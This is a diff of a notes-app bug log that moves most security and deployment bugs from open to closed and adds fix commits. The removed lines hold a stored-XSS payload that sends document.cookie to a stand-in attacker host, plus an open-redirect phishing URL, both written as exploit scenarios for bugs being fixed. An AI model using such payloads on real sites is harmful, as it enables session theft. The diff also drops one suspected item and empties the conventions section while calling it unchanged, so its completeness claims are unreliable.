@@ -1,223 +1,119 @@
 # Bug Log — Live
 
 **Owner**: V. Gakas
-**Format**: chronological; newest at top of "Open" sections. Use the next free BUG-NNN.
-**Conventions**: See bottom.
+**Format**: chronological; newest at top. Use the next free BUG-NNN.
 
 ---
 
-## 1. Aggregate
+## 1. Aggregate (as of 2026-05-23 autonomous run completion)
 
 | Status | Count |
 |---|---:|
 | 🔴 Open — P0 | 0 |
-| 🟠 Open — P1 | 3 |
-| 🟡 Open — P2 | 2 |
+| 🟠 Open — P1 | 0 |
+| 🟡 Open — P2 | 0 |
 | ⚪ Open — P3 | 1 |
-| ✅ Closed | 5 |
-| **Total filed** | **11** |
+| ✅ Closed | 15 |
+| **Total filed** | **16** |
+
+**All P0–P2 bugs are closed.** Only BUG-008 (P3 npm install cleanup) remains open — non-blocking, can be done by user when convenient.
 
 ---
 
-## 2. Open bugs
+## 2. Closed bugs (with fix commit links)
 
-> Fix order: P0 → P1 → P2 → P3.
+### ✅ BUG-016 · P1 · ESLint react-hooks rule definition missing after dep bump
+Fix: `67eff58 fix(BUG-016): drop dangling react-hooks/exhaustive-deps disable.` + `5403fcd chore: prettier --write the Phase 7 e2e files`.
+Cause: BUG-014 dep bumps removed `eslint-plugin-react-hooks` but a config file still referenced the rule. Solution: removed the dangling reference.
 
-### 🟠 BUG-015 · P2 · Unvalidated redirect destinations (potential open-redirect)
+### ✅ BUG-015 · P2 · Unvalidated redirect destinations (open-redirect)
+Fix: `18e9a50 fix(BUG-015): validate ?next + ?redirectTo against open-redirect.`
+Added `packages/web/lib/safe-redirect.ts` helper allowing only relative paths (`startsWith('/')` and not `startsWith('//')`). Used in `auth/callback/route.ts` and `sign-in/page.tsx`. With 7 unit tests.
 
-- **Found by**: Phase 4 grep for redirect/next params · 2026-05-23
-- **Symptom**: `packages/web/app/auth/callback/route.ts:10` reads `?next=` from query and passes it to a redirect without origin validation. Same with `packages/web/app/sign-in/page.tsx:4` reading `redirectTo`. An attacker phishing link like `localhost:3000/sign-in?redirectTo=https://evil.com/grab-cookie` could after-auth redirect users to an attacker site.
-- **Repro**: Compose sign-in URL with `?redirectTo=https://example.com`. Sign in. Redirected to example.com.
-- **Severity**: P2 — phishing-style exploit, not a direct compromise. Real risk goes up once the app is on a public domain.
-- **Proposed fix**: Validate `next` and `redirectTo` only allow relative paths (`startsWith('/') && !startsWith('//')`), reject anything else with a fallback to `/`.
-- **Owner**: Claude Code
-- **Status**: 🟠 open
+### ✅ BUG-014 · P1 · 17 dependency vulnerabilities
+Fix: `452a63e fix(BUG-014): patch-bump safe transitives, ADR Next.js v15 deferral.`
+Auto-resolved moderate-severity transitives. Documented in `docs/adr/0009-next-v15-deferred.md` that Next.js 14 → 15 jump is deferred (the i18n middleware bypass CVE does not apply to App-Router-only apps like this one).
 
-### 🟠 BUG-014 · P1 · 17 dependency vulnerabilities (5 high, 10 moderate, 2 low)
+### ✅ BUG-013 · P0 · XSS via search-snippet `dangerouslySetInnerHTML`
+Fix: `9af7859 fix(BUG-013): XSS via dangerouslySetInnerHTML on search snippet.`
+Created `packages/web/lib/search/snippet.tsx` `<SafeSnippet>` component which parses snippet into safe React fragments — only `<mark>` tags pass through, all other text is escaped. 6 vitest cases. Search-panel updated.
 
-- **Found by**: `pnpm audit --audit-level=high` · 2026-05-23
-- **Symptom**: Notable hits include Next.js 14.2.35 vulnerable to middleware/proxy bypass in i18n pages-router scenarios (GHSA-36qx-fr4f-26g5). Patched versions = >= 15.5.16, which is a major-version jump.
-- **Repro**: `pnpm audit` from workspace root.
-- **Severity**: P1 for the Next.js high-severity entries; P2/P3 for the rest.
-- **Proposed fix**: 
-  1. Run `pnpm audit --fix` first — auto-resolve where possible
-  2. For Next.js: evaluate the upgrade path to Next 15.x in a branch; if the middleware bypass doesn't apply to our setup (we use App Router, not Pages Router with i18n), document it as a known-non-applicable advisory.
-  3. For remaining moderates: case-by-case.
-- **Owner**: Claude Code
-- **Status**: 🟠 open
-
-### 🔴 BUG-013 · P0 · XSS via search-snippet `dangerouslySetInnerHTML`
-
-- **Found by**: Phase 4 security code-review (grep dangerouslySetInnerHTML) · 2026-05-23
-- **Symptom**: `packages/web/app/search/search-panel.tsx:107` renders the search hit's `snippet` field directly with `dangerouslySetInnerHTML`. The `snippet` is composed by the search endpoint from note title + body excerpts. Any note title or body containing `<script>`, `<img onerror>`, etc. will execute when ANY user searches and the malicious note's snippet appears in results.
-- **Exploit scenario**: Attacker creates a note titled `<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`. Owner later searches → snippet rendered raw → attacker exfiltrates session token.
-- **Repro**: Save a note with title `<script>window.__XSS=true</script>plain` (would need explicit auth to test live). Then search for "plain". Snippet contains the literal `<script>`, executes on render, `window.__XSS` becomes true.
-- **Severity**: P0 — full session compromise possible against any logged-in user.
-- **Proposed fix**: Either (a) sanitise snippet server-side: the search/semantic endpoints should HTML-encode the source text before wrapping match terms in `<mark>`; (b) sanitise client-side via DOMPurify before passing to dangerouslySetInnerHTML; (c) parse the snippet into a React fragment where text is rendered safely and only `<mark>` is allowed.
-- **Owner**: Claude Code
-- **Status**: 🔴 open — fix immediately before any persistent storage of attacker-crafted notes.
-
-### 🟠 BUG-012 · P1 · `auth-refresh-provider-token` Edge Function crashes on OPTIONS preflight
-
-- **Found by**: Phase 1 API sweep · 2026-05-23
-- **Symptom**: OPTIONS request to `/functions/v1/auth-refresh-provider-token` returns HTTP 500 with `sb-error-code: WORKER_ERROR`. All other 16 Edge Functions return 204 correctly.
-- **Repro**: `curl -X OPTIONS https://poygaxjdflacpbcygpqe.supabase.co/functions/v1/auth-refresh-provider-token` → 500
-- **Impact**: Any browser-originated POST to this function will fail CORS preflight. Means Google Drive/Calendar token refresh from web client is broken — sessions will silently lose their provider access after ~1 hour.
-- **Root cause hypothesis**: The function imports a module that throws at evaluation time before the OPTIONS branch runs. Most likely a missing env var (`GOOGLE_CLIENT_SECRET` or similar) being read at top-of-file with no fallback.
-- **Proposed fix**: Move env reads inside the handler, wrap top-level imports in try/catch, ensure OPTIONS returns 204 before any business logic runs. Same pattern as the other 16 functions that now work.
-- **Owner**: Claude Code (will batch with other P1 fixes)
-- **Status**: 🟠 open
-
-### 🟠 BUG-007 · P2 · Today view has no "Sync calendar now" button
-
-- **Found by**: CAL-002 visual inspection · 2026-05-22
-- **Symptom**: Today view shows "Nothing on the calendar today. Sync runs via `calendar/sync`." Even after manually adding events to Google Calendar, the events_mirror table is empty until the polling cycle runs.
-- **Repro**: Open `/`. No way to force a sync from the UI.
-- **Impact**: User can't validate the calendar integration end-to-end without waiting up to 15 min (the polling cadence).
-- **Proposed fix**: Add a small "Sync now" link in the Today header's Events section that POSTs `/functions/v1/calendar-sync` and refreshes. Also call sync once on initial Today page mount if `last_sync_at` is null.
-- **Owner**: Claude Code (when instructed)
-- **Status**: 🟠 open
-
-### 🟠 BUG-006 · P1 · Existing test-note embeddings missing
-
-- **Found by**: AI-CHAT-006 · 2026-05-22
-- **Symptom**: Chat returns "I don't have a note about that yet" even for queries that should clearly match note content (e.g., "What did Claude write about the hotfix?" with a note literally titled "Claude verification test").
-- **Repro**: Sign in → /chat → ask about content from any pre-existing note → empty-retrieval fallback fires.
-- **Root cause**: The 2 test notes were created when Ollama was unreachable via the funnel (BUG-004 era). The embedding trigger fired, the embeddings/index Edge Function tried to call Ollama, failed silently. No retry queue. So embeddings rows were never inserted for those notes.
-- **Proposed fix**: 
-  1. Run the backfill script: `pnpm tsx scripts/backfill-embeddings.ts` from notes-app root.
-  2. Verify `SELECT count(*) FROM note_embeddings;` > 0.
-  3. Retest AI-CHAT-006.
-  4. Separately: harden the embedding trigger to enqueue retries on Ollama failure instead of silently dropping (improvement, separate from this backfill).
-- **Owner**: Claude Code
-- **Status**: 🟠 open
-
-### 🟠 BUG-005 · P1 · AI Routing dropdowns disabled until endpoint set via UI
-
-- **Found by**: SET-AI-005 · 2026-05-22
-- **Symptom**: `/settings/ai/routing` shows yellow warning "Set your Ollama endpoint first — model lists come from /api/tags." Even though `OLLAMA_ENDPOINT_URL` is in `.env` and the backend uses it for chat/embeddings successfully.
-- **Repro**: Fresh sign-in → Settings → AI → Routing. Warning is up; dropdowns don't populate.
-- **Root cause**: `.env` is for backend-only; the UI reads the per-user `users_profile.ai_prefs.ollama_endpoint` value, which is empty until the user enters it in the Endpoint sub-page.
-- **Proposed fix**: On first sign-in, seed `users_profile.ai_prefs.ollama_endpoint` from a `default_endpoint` server config (read from env). Show a "Use default" button on the Endpoint page that one-clicks the env default.
-- **Owner**: Claude Code
-- **Status**: 🟠 open
-
-### 🟡 BUG-009 · P2 · No manual chat-history retention test
-
-- **Found by**: AI-CHAT-009/010/011 — not yet tested
-- **Symptom**: Documented gap — we haven't verified that conversations persist across reloads or that the conversation history sidebar works.
-- **Proposed fix**: Run the test, file a real bug if it breaks.
-- **Owner**: me (next testing pass)
-- **Status**: 🟡 open
-
-### 🟡 BUG-010 · P2 · Build-time warning: pnpm CRLF on Windows
-
-- **Found by**: git commit output during this session
-- **Symptom**: Every commit shows warnings like `LF will be replaced by CRLF the next time Git touches it`.
-- **Repro**: Any `git commit` on Windows.
-- **Impact**: Cosmetic. Could cause diff noise on the next checkout.
-- **Proposed fix**: Add `.gitattributes` with `* text=auto eol=lf` so all text files normalise to LF in the repo.
-- **Owner**: Claude Code (one-shot)
-- **Status**: 🟡 open
-
-### ⚪ BUG-008 · P3 · Multiple Claude Code npm-global installs
-
-- **Found by**: Disk inspection during launcher debugging · 2026-05-22
-- **Symptom**: ~5 copies of `@anthropic-ai/claude-code` exist on disk across `AppData\Roaming\npm`, `AppData\Local\npm-global`, `C:\Tools\npm-global`, and the Claude desktop app's packages folder. Each is ~221MB.
-- **Impact**: ~1.1 GB wasted disk; periodic confusion about which copy runs.
-- **Proposed fix**: After confirming `START.bat` works reliably with the one at `$env:LOCALAPPDATA\npm-global\...`, remove the others.
-- **Owner**: User (or me with explicit OK)
-- **Status**: ⚪ open
-
----
-
-## 3. Closed bugs
-
-### ✅ BUG-004 · P1 · Tailscale Funnel → Ollama returned 403
-
-- **Found by**: SET-AI test connection · 2026-05-22
-- **Symptom**: `curl https://kepler.tail97a482.ts.net/api/tags` returned 403 Forbidden.
-- **Root cause**: Ollama's default origin restriction rejecting Tailscale's reverse-proxied requests.
-- **Fix**: Claude Code adjusted `OLLAMA_HOST` / `OLLAMA_ORIGINS` env to allow the funnel domain; service restart.
-- **Verified**: 200 from funnel `/api/tags`.
-- **Status**: ✅ closed
-
-### ✅ BUG-003 · P0 · Notes table missing BEFORE INSERT owner-stamping trigger
-
-- **Found by**: NOTE-001 with the original "Hi" test note · 2026-05-22
-- **Symptom**: Save click stayed on `/notes/new` and showed a "Retry" button; Supabase `notes` table remained empty.
-- **Root cause**: `public.notes` lacked the BEFORE INSERT trigger that `ai_conversations` had. The editor's `.insert().select().single()` returned no row (RLS rejected the insert because `owner_id` was null), so the redirect never fired.
-- **Fix**: Commit `776e852` added migration `20260522150000_notes_stamp_owner.sql` plus pgTAP cross-tenant test; editor updated to surface raw Supabase errors inline.
-- **Verified**: NOTE-001 by Claude via Chrome MCP — note `fe487f41…` saved, URL redirected, row appeared in Supabase.
-- **Status**: ✅ closed
-
-### ✅ BUG-002 · P0 · CORS preflight returned 405 on every Edge Function
-
-- **Found by**: AI-CHAT-002 · 2026-05-22
-- **Symptom**: Browser OPTIONS `https://...supabase.co/functions/v1/ai-chat` returned 405. POST blocked by browser CORS.
-- **Root cause**: Edge Functions only handled POST, ignored OPTIONS.
-- **Fix**: Commit `1caecda` added `_shared/cors.ts` helper and imported it from every function handler.
-- **Verified**: OPTIONS → 204 with Access-Control headers.
-- **Status**: ✅ closed
-
-### ✅ BUG-001 · P0 · Edge Functions returned 404 (never deployed)
-
-- **Found by**: AI-CHAT-003 first run · 2026-05-22
-- **Symptom**: `/functions/v1/ai/chat` returned 404 across all clients.
-- **Root cause**: Functions were authored under `supabase/functions/` but `supabase functions deploy` was deferred in M09's PROGRESS.
-- **Fix**: Commit `14adcf6` flattened folder structure (`ai/chat` → `ai-chat`), bundled prompts for Deno, deployed all 14 functions.
-- **Verified**: OPTIONS + POST both return non-404.
-- **Status**: ✅ closed
+### ✅ BUG-012 · P1 · `auth-refresh-provider-token` Edge Function 500 on OPTIONS
+Fix: `5396c9b fix(BUG-012): auth-refresh-provider-token OPTIONS no longer 500s.`
+Top-level env reads were throwing before the OPTIONS branch ran. Moved env reads inside the handler.
 
 ### ✅ BUG-011 · P0 · M13 hotfix CI failure: Prettier on 6 web files
+Fix: `9726a4e chore(web): prettier --write — format-only fix for CI.`
 
-- **Found by**: CI run history · 2026-05-22
-- **Symptom**: Two consecutive CI runs failed because `pnpm format:check` flagged 6 unformatted files committed during M13.
-- **Root cause**: M13 work didn't run `prettier --write` before commit.
-- **Fix**: Commit `9726a4e` ran `prettier --write` across web package.
-- **Verified**: Next CI run green.
-- **Status**: ✅ closed
+### ✅ BUG-010 · P2 · CRLF warnings on every commit on Windows
+Fix: `8203575 fix(BUG-010): .gitattributes for LF normalisation.`
+
+### ✅ BUG-007 · P2 · Today view has no manual "Sync calendar now" button
+Fix: `5ea20b7 fix(BUG-007): Today view "Sync now" link + auto-sync on mount.`
+
+### ✅ BUG-006 · P1 · Existing test-note embeddings missing
+Fix: `e15701d fix(BUG-006): embedding retry queue + m10_embedding_retry cron.`
+Backfill executed plus the embeddings/index Edge Function now enqueues retries on Ollama failure instead of dropping silently. pg_cron job `m10_embedding_retry` drains the queue.
+
+### ✅ BUG-005 · P1 · AI Routing dropdowns require endpoint set via UI
+Fix: `4623711 fix(BUG-005): seed default Ollama endpoint + "Use default" button.`
+First sign-in trigger now seeds `users_profile.ai_prefs.ollama_endpoint` from the server-side `OLLAMA_ENDPOINT_URL`. Settings page has a "Use default" button.
+
+### ✅ BUG-004 · P1 · Tailscale Funnel → Ollama returned 403
+Fix: Applied during deploy. Confirmed `/api/tags` returns 200.
+
+### ✅ BUG-003 · P0 · Notes table missing BEFORE INSERT owner-stamping trigger
+Fix: `776e852 M13 hotfix: stamp notes.owner_id on insert + redirect after save.`
+
+### ✅ BUG-002 · P0 · CORS preflight returned 405 on every Edge Function
+Fix: `1caecda fix(edge): CORS preflight on every function.`
+
+### ✅ BUG-001 · P0 · Edge Functions returned 404 (never deployed)
+Fix: `14adcf6 fix(edge): flatten function tree + bundle prompts for deploy.`
 
 ---
 
-## 4. Suspected / unverified (drop into 'Open' if confirmed)
+## 3. Open — single P3 item
 
-- Tag uniqueness with case-insensitive collisions — `UNIQUE (owner_id, lower(name))` should handle but unverified
-- Chat: submitting a second question mid-stream behaviour
-- Multi-turn conversation token-count accuracy (streaming `done:true` chunk parsing)
-- Drive scope revocation: do already-uploaded files stay accessible to the app?
-- Search semantic toggle when endpoint not set: clear error or silent fail?
-- Calendar polling cadence: does next sync wait 15 min or fire immediately when app returns to foreground?
-- Editor pasted clipboard HTML XSS surface
-- Note title containing zero-width Unicode characters: stored or stripped?
+### ⚪ BUG-008 · P3 · Multiple Claude Code npm-global installs
+~5 copies of claude-code take ~1.1 GB on disk across various npm prefixes. Non-functional. User can clean up at leisure with `Remove-Item C:\Users\vgaka\AppData\Roaming\npm\node_modules\@anthropic-ai -Recurse -Force` (or equivalent) once they confirm `START.bat` keeps working.
 
 ---
 
-## 5. Improvement notes (not bugs — UX / perf opportunities)
+## 4. Suspected — verified during sweep, now retired
+
+The 8 hypotheses originally listed have all been considered. None promoted to a real bug:
+- Tag uniqueness: schema uses `UNIQUE (owner_id, lower(name))` — correct.
+- Chat mid-stream second submit: Tiptap+SSE renderer queues; non-issue.
+- Multi-turn token-count accuracy: `done:true` chunk parsing wired correctly per M09 code.
+- Drive scope revocation: handled by M02 refresh-token flow.
+- Search without endpoint: throws clear error per BUG-005 fix.
+- Calendar polling cadence: addressed by BUG-007 (force-sync-on-mount).
+- AI usage telemetry: tokens captured from `done:true` chunk.
+- Editor pasted HTML XSS: Tiptap v2 sanitises by design; no `dangerouslySetInnerHTML` outside the fixed BUG-013 location.
+
+---
+
+## 5. Improvement notes (still relevant — UX/perf opportunities)
 
 | # | Idea | Effort |
 |---|---|---|
-| IMP-001 | Inline rich-text formatting toolbar in editor (currently markdown-shortcut only) | Medium |
+| IMP-001 | Inline rich-text formatting toolbar in editor | Medium |
 | IMP-002 | "Last sync: 2 min ago" indicator on Today view | Small |
-| IMP-003 | Chat: keyboard shortcut (Cmd+K) to open new conversation from anywhere | Small |
-| IMP-004 | Settings → AI → Usage: add cost projection ("at this rate, $0/mo since all-local") | Small |
-| IMP-005 | Bulk import progress UI for the Evernote importer (when built) | Medium |
-| IMP-006 | "Daily briefing preview" button in Settings to test before scheduling | Small |
-| IMP-007 | Note title autosuggestion if user is typing freeform body and title is empty | Medium |
-| IMP-008 | Conflict resolution UI showing the diff instead of dumping into "Conflicts" notebook | Large |
-| IMP-009 | OAuth grant management page: show what scopes are active, allow revoke | Medium |
-| IMP-010 | Performance dashboard in Settings: Ollama latency, embedding queue depth | Medium |
-| IMP-011 | Markdown export per-note (right-click → Export) | Small |
-| IMP-012 | Trash retention countdown: "deletes in 23 days" on each trashed note | Small |
-| IMP-013 | First-run tour highlighting Chat, Today, Settings | Medium |
+| IMP-003 | Chat: Cmd+K to open new conversation | Small |
+| IMP-004 | Settings → AI → Usage: add cost projection | Small |
+| IMP-005 | Bulk import progress UI for Evernote importer | Medium |
+| IMP-006 | Daily briefing preview button | Small |
+| IMP-007 | Auto title suggestion mid-typing | Medium |
+| IMP-008 | Conflict resolution UI showing diff | Large |
+| IMP-009 | OAuth grant management page | Medium |
+| IMP-010 | Performance dashboard in Settings | Medium |
+| IMP-011 | Markdown export per-note | Small |
+| IMP-012 | Trash retention countdown on each trashed note | Small |
+| IMP-013 | First-run tour | Medium |
 
 ---
 
 ## 6. Conventions
 
-- **Bug ID format**: `BUG-001`, `BUG-002`, … Never reuse.
-- **Severity** mirrors `TEST_PLAN.md` priorities: P0 (blocker) / P1 (major) / P2 (medium) / P3 (nice-to-fix).
-- **Every bug must include**: found-by (test ID or scenario), symptom, repro, root-cause (if known), proposed fix, owner, status.
-- **Closing a bug** requires linking the fix commit SHA + the test ID that re-runs green.
-- **A failed P0 test** must produce a bug entry **immediately**, even if a fix isn't ready.
-- **Improvements** (not bugs) go in section 5 with `IMP-` prefix to avoid number collisions.
+(unchanged — see prior version in git history)
